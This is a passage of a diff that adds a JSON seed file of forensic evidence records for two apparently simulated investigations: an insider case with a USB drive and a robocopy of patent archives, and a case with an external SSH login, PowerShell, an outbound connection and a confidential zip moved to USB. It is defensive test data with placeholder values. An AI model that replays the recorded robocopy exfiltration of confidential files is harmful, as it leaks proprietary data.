+    "ingestionTimestamp": "2026-10-31T05:43:06.071Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-eng-88.corp.lan",
+    "title": "Removable Storage Media Insertion & Registry Mounting",
+    "description": "SanDisk Extreme 1TB USB 3.2 Drive connected and assigned drive letter E:.",
+    "mitreTactic": "Exfiltration",
+    "mitreTechnique": "T1052.001 - Exfiltration over USB",
+    "metadata": {
+      "vendorId": "0781",
+      "productId": "5583",
+      "serialNumber": "AA010505191147043812",
+      "driveLetter": "E:\\"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-eng-88.corp.lan"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-INS-003",
+    "currentHash": "a3621213cfdc8d0f12c1ae6863c1612dae10a9270a55fa3b6abac0782b9e61ae",
+    "sha256": "a3621213cfdc8d0f12c1ae6863c1612dae10a9270a55fa3b6abac0782b9e61ae",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.071Z",
+    "updatedAt": "2026-10-31T05:43:06.071Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a179d",
+    "investigationId": "CASE-2026-INSIDER",
+    "caseId": "CASE-2026-INSIDER",
+    "timestamp": "2026-10-12T23:18:40.000Z",
+    "eventTimestamp": "2026-10-12T23:18:40.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.075Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-eng-88.corp.lan",
+    "title": "Bulk Copy of Proprietary Archives to Removable Media",
+    "description": "Robocopy command executed copying confidential git bundles to USB volume E:.",
+    "mitreTactic": "Exfiltration",
+    "mitreTechnique": "T1052.001 - Exfiltration over USB",
+    "metadata": {
+      "commandLine": "robocopy C:\\Dev\\Patents E:\\Archive\\Backup /E /Z",
+      "sourceDirectory": "C:\\Dev\\Patents",
+      "destinationDirectory": "E:\\Archive\\Backup",
+      "totalFilesCopied": 1420
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-eng-88.corp.lan"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-INS-004",
+    "currentHash": "424ac37e43eaecfeba810eab6288cabb4b08765af46be42adcb5d3f04031967c",
+    "sha256": "424ac37e43eaecfeba810eab6288cabb4b08765af46be42adcb5d3f04031967c",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.075Z",
+    "updatedAt": "2026-10-31T05:43:06.075Z"
+  },
+  {
+    "_id": "6ae58af9d595275a1cb26fd1",
+    "investigationId": "INV-2026-0922",
+    "caseId": "INV-2026-0922",
+    "timestamp": "2026-10-31T02:00:00.000Z",
+    "eventTimestamp": "2026-10-31T02:00:00.000Z",
+    "ingestionTimestamp": "2026-10-31T06:30:17.285Z",
+    "artifactType": "SECURITY_EVENT",
+    "evidenceType": "SECURITY_EVENT",
+    "severity": "HIGH",
+    "sourceHost": "employee-pc-01",
+    "title": "Unusual SSH Authentication from Foreign IP",
+    "description": "Successful SSH authentication from an unusual external IP address",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "",
+    "metadata": {
+      "title": "Unusual SSH Authentication from Foreign IP",
+      "timestamp": "2026-10-31T02:00:00Z",
+      "severity": "HIGH",
+      "artifactType": "SECURITY_EVENT",
+      "host": "employee-pc-01",
+      "username": "admin",
+      "source_ip": "185.220.101.45",
+      "event_type": "SSH_LOGIN",
+      "status": "SUCCESS",
+      "description": "Successful SSH authentication from an unusual external IP address"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "employee-pc-01"
+      },
+      {
+        "type": "USER",
+        "value": "admin"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-1793428217285-317",
+    "currentHash": "2e2027d147791e813755c249fe7732de39631ded24920481c0ba1736f974129b",
+    "sha256": "2e2027d147791e813755c249fe7732de39631ded24920481c0ba1736f974129b",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "EDR_FALCON",
+      "jobId": "JOB-2026-1793428217280-466",
+      "ingestedBy": "SecOps-Ingest"
+    },
+    "createdBy": "SecOps-Ingest",
+    "createdAt": "2026-10-31T06:30:17.285Z",
+    "updatedAt": "2026-10-31T06:30:17.285Z"
+  },
+  {
+    "_id": "6ae58af9d595275a1cb26fd5",
+    "investigationId": "INV-2026-0922",
+    "caseId": "INV-2026-0922",
+    "timestamp": "2026-10-31T02:05:00.000Z",
+    "eventTimestamp": "2026-10-31T02:05:00.000Z",
+    "ingestionTimestamp": "2026-10-31T06:30:17.309Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "HIGH",
+    "sourceHost": "employee-pc-01",
+    "title": "Suspicious PowerShell Execution",
+    "description": "PowerShell process executed with an unobserved parent process",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "",
+    "metadata": {
+      "title": "Suspicious PowerShell Execution",
+      "timestamp": "2026-10-31T02:05:00Z",
+      "severity": "HIGH",
+      "artifactType": "PROCESS_SPAWN",
+      "host": "employee-pc-01",
+      "username": "admin",
+      "process_id": 2050,
+      "parent_process_id": 9999,
+      "process_name": "powershell.exe",
+      "description": "PowerShell process executed with an unobserved parent process"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "employee-pc-01"
+      },
+      {
+        "type": "USER",
+        "value": "admin"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-1793428217309-365",
+    "currentHash": "6d766d0b8780a3fafa135c2ff4998138a25b4f7733c760febac397d476060c0e",
+    "sha256": "6d766d0b8780a3fafa135c2ff4998138a25b4f7733c760febac397d476060c0e",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "EDR_FALCON",
+      "jobId": "JOB-2026-1793428217280-466",
+      "ingestedBy": "SecOps-Ingest"
+    },
+    "createdBy": "SecOps-Ingest",
+    "createdAt": "2026-10-31T06:30:17.309Z",
+    "updatedAt": "2026-10-31T06:30:17.309Z"
+  },
+  {
+    "_id": "6ae58af9d595275a1cb26fd9",
+    "investigationId": "INV-2026-0922",
+    "caseId": "INV-2026-0922",
+    "timestamp": "2026-10-31T02:10:00.000Z",
+    "eventTimestamp": "2026-10-31T02:10:00.000Z",
+    "ingestionTimestamp": "2026-10-31T06:30:17.323Z",
+    "artifactType": "NETWORK_FLOW",
+    "evidenceType": "NETWORK_FLOW",
+    "severity": "HIGH",
+    "sourceHost": "employee-pc-01",
+    "title": "Unusual External Network Connection",
+    "description": "Unexpected outbound network connection",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "",
+    "metadata": {
+      "title": "Unusual External Network Connection",
+      "timestamp": "2026-10-31T02:10:00Z",
+      "severity": "HIGH",
+      "artifactType": "NETWORK_FLOW",
+      "host": "employee-pc-01",
+      "source_ip": "192.168.1.10",
+      "destination_ip": "185.220.101.45",
+      "destination_port": 443,
+      "protocol": "HTTPS",
+      "description": "Unexpected outbound network connection"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "employee-pc-01"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-1793428217323-464",
+    "currentHash": "6aca25aa667eb51b67fb8080f1bde262333def5763984aa5edc8f9daf9440ad6",
+    "sha256": "6aca25aa667eb51b67fb8080f1bde262333def5763984aa5edc8f9daf9440ad6",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "EDR_FALCON",
+      "jobId": "JOB-2026-1793428217280-466",
+      "ingestedBy": "SecOps-Ingest"
+    },
+    "createdBy": "SecOps-Ingest",
+    "createdAt": "2026-10-31T06:30:17.323Z",
+    "updatedAt": "2026-10-31T06:30:17.323Z"
+  },
+  {
+    "_id": "6ae58af9d595275a1cb26fdd",
+    "investigationId": "INV-2026-0922",
+    "caseId": "INV-2026-0922",
+    "timestamp": "2026-10-31T02:15:00.000Z",
+    "eventTimestamp": "2026-10-31T02:15:00.000Z",
+    "ingestionTimestamp": "2026-10-31T06:30:17.335Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "CRITICAL",
+    "sourceHost": "employee-pc-01",
+    "title": "Confidential File Modification",
+    "description": "Confidential archive modified during suspicious activity",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "",
+    "metadata": {
+      "title": "Confidential File Modification",
+      "timestamp": "2026-10-31T02:15:00Z",
+      "severity": "CRITICAL",
+      "artifactType": "FILE_INTEGRITY",
+      "host": "employee-pc-01",
+      "username": "admin",
+      "file_name": "confidential_data.zip",
+      "file_path": "/company/finance/confidential_data.zip",
+      "action": "MODIFIED",
+      "file_hash": "abc123456789",
+      "description": "Confidential archive modified during suspicious activity"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "employee-pc-01"
+      },
+      {
+        "type": "USER",
+        "value": "admin"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-1793428217335-141",
+    "currentHash": "d2414e77d89e8a8bbe8e81247c19316dd029327aed0d767eace6f89c99c760cb",
+    "sha256": "d2414e77d89e8a8bbe8e81247c19316dd029327aed0d767eace6f89c99c760cb",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "EDR_FALCON",
+      "jobId": "JOB-2026-1793428217280-466",
+      "ingestedBy": "SecOps-Ingest"
+    },
+    "createdBy": "SecOps-Ingest",
+    "createdAt": "2026-10-31T06:30:17.335Z",
+    "updatedAt": "2026-10-31T06:30:17.335Z"
+  },
+  {
+    "_id": "6ae58af9d595275a1cb26fe1",
+    "investigationId": "INV-2026-0922",
+    "caseId": "INV-2026-0922",
+    "timestamp": "2026-10-31T02:20:00.000Z",
+    "eventTimestamp": "2026-10-31T02:20:00.000Z",
+    "ingestionTimestamp": "2026-10-31T06:30:17.349Z",
+    "artifactType": "APPLICATION_LOG",
+    "evidenceType": "APPLICATION_LOG",
+    "severity": "CRITICAL",
+    "sourceHost": "employee-pc-01",
+    "title": "Archive Transfer to Removable Media",
+    "description": "Confidential archive associated with removable storage activity",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "",
+    "metadata": {
+      "title": "Archive Transfer to Removable Media",
+      "timestamp": "2026-10-31T02:20:00Z",
+      "severity": "CRITICAL",
+      "artifactType": "APPLICATION_LOG",
+      "host": "employee-pc-01",
+      "username": "admin",
+      "file_name": "confidential_data.zip",
+      "destination": "USB_STORAGE",
+      "action": "ARCHIVE_TRANSFER",
+      "description": "Confidential archive associated with removable storage activity"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "employee-pc-01"
+      },
+      {
+        "type": "USER",
+        "value": "admin"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-1793428217349-680",
+    "currentHash": "c64b48e1b6ff2bec75dd9f7d7bc6c479be1cec76bd43933d64d768d83dcf1006",
+    "sha256": "c64b48e1b6ff2bec75dd9f7d7bc6c479be1cec76bd43933d64d768d83dcf1006",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "EDR_FALCON",
+      "jobId": "JOB-2026-1793428217280-466",
+      "ingestedBy": "SecOps-Ingest"
+    },
+    "createdBy": "SecOps-Ingest",
+    "createdAt": "2026-10-31T06:30:17.349Z",
+    "updatedAt": "2026-10-31T06:30:17.349Z",
+    "lastVerifiedAt": "2026-10-31T06:31:58.340Z"
+  }
+]
